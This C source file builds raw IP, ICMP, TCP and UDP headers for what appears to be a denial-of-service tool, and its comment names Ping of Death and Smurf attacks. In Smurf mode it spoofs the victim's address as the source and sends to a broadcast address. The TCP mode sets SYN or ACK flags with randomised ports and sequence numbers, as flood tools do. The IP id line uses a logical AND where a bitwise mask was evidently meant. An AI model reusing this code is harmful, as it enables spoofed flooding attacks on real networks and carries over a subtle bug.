#include "init_header.h"

void ip_init_header(struct iphdr *ip_hdr, char *dst_ip, char *brc_ip, char protocol){
	// IP頭部初始化
	int len; 

	if(protocol == 'T'){
		ip_hdr->protocol = IPPROTO_TCP;
		len = sizeof(struct iphdr) + sizeof(struct tcphdr);
		ip_hdr->saddr = 0;
		ip_hdr->daddr = inet_addr(dst_ip);
	}	
	else if(protocol == 'U'){
		ip_hdr->protocol = IPPROTO_UDP;
		len = sizeof(struct iphdr) + sizeof(struct udphdr);
		ip_hdr->saddr = 0;
		ip_hdr->daddr = inet_addr(dst_ip);
	}	
	else if(protocol == 'S'){
		ip_hdr->protocol = IPPROTO_ICMP;
		len = sizeof(struct iphdr) + sizeof(struct icmphdr);
		ip_hdr->saddr = inet_addr(dst_ip); 
		ip_hdr->daddr = inet_addr(brc_ip);
	}
	else if(protocol == 'P'){
		ip_hdr->protocol = IPPROTO_ICMP;
		len = sizeof(struct iphdr) + sizeof(struct icmphdr);
		ip_hdr->saddr = 0;
		ip_hdr->daddr = inet_addr(dst_ip);
	}

	ip_hdr->version = 4;
	ip_hdr->ihl = 5;
	ip_hdr->tos = 0;
	ip_hdr->tot_len = htons(len);
	ip_hdr->id = random() && 0x00ffff;
	ip_hdr->frag_off = htons(0);
	ip_hdr->ttl = 255;
	ip_hdr->check = 0;


}

void icmp_init_header(struct iphdr *ip_hdr, struct icmphdr *icmp_hdr, char *dst_ip, char *brc_ip, char mode){
	char Mode = mode;
	if(Mode != 'S') Mode = 'P';		// PoD, Smurf attack

	ip_init_header(ip_hdr, dst_ip, brc_ip, Mode);

	// icmp header
	int sequence = 1;
	icmp_hdr->type = ICMP_ECHO;
	icmp_hdr->code = 0;
	icmp_hdr->checksum = 0;
	icmp_hdr->un.echo.sequence = htons(sequence);
	icmp_hdr->un.echo.id = (((ip_hdr->saddr) >> 16) ^ ip_hdr->saddr) & 0x00ffff;
}


void tcp_init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr *pseudoheader, char *dst_ip, int dst_port, char mode){
	srand((unsigned) time(NULL));
	ip_init_header(ip_hdr, dst_ip, (char *) 0, 'T');

	// TCP頭部初始化
	tcp_hdr->th_sport = htons( rand()%16383 + 49152 );
	tcp_hdr->th_dport = htons(dst_port);
	tcp_hdr->th_seq = htonl( rand()%90000000 + 2345 ); 
	tcp_hdr->th_ack = 0; 
	tcp_hdr->th_win = htons (2048);  
	tcp_hdr->th_sum = 0;
	tcp_hdr->th_urp = 0;

	// mode----------------------------------------------
	if(mode == 'A' || mode == 'a')	tcp_hdr->th_flags = TH_ACK;
	else if(mode == 'S' || mode == 's')	tcp_hdr->th_flags = TH_SYN;
	// --------------------------------------------------

	//TCP偽頭部初始化
	pseudoheader->zero = 0;
	pseudoheader->protocol = IPPROTO_TCP;
	pseudoheader->length = htons(sizeof(struct tcphdr));
	pseudoheader->daddr = inet_addr(dst_ip);


}

void udp_init_header(struct iphdr *ip_hdr, struct udphdr *udp_hdr, struct pseudohdr *pseudoheader, char *dst_ip, int dst_port){
	srand((unsigned) time(NULL));
	ip_init_header(ip_hdr, dst_ip, (char *) 0, 'U');

	udp_hdr->uh_sport = htons( rand()%16383 + 49152 );
	udp_hdr->uh_dport = htons(dst_port);
	udp_hdr->uh_ulen = htons(sizeof(struct udphdr));

	//TCP偽頭部初始化
	pseudoheader->zero = 0;
	pseudoheader->protocol = IPPROTO_UDP;
	pseudoheader->length = htons(sizeof(struct udphdr));
	pseudoheader->daddr = inet_addr(dst_ip);

}
